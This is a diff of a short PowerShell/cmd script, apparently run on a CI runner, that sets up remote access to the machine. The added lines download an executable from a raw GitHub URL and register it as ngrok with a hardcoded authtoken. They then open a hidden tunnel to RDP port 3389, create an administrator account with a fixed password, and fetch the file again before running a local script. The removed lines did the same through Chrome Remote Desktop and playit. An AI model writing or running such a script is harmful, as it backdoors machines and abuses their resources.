@@ -1,12 +1,10 @@
-& {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
-curl -o zip.zip -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/zip.zip"
-unzip zip.zip
-
-./playit-windows-x86_64-signed.msi /Silent
-
-cmd /c net user /add USER P@ssw0rd!
-cmd /c net localgroup /add administrators USER
-
-%ProgramFiles%\playit_gg\bin\playit.exe
-
-powershell.exe -ExecutionPolicy Bypass
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe" -OutFile ngrok.exe 
+cmd /c ngrok.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
+cmd /c net user /add Admin P@ssw0rd.
+cmd /c net localgroup /add administrators Admin
+sleep 240
+curl -o zip.exe -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe"
+.\0.ps1
+curl -o zip.exe -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe"
+.\0.ps1
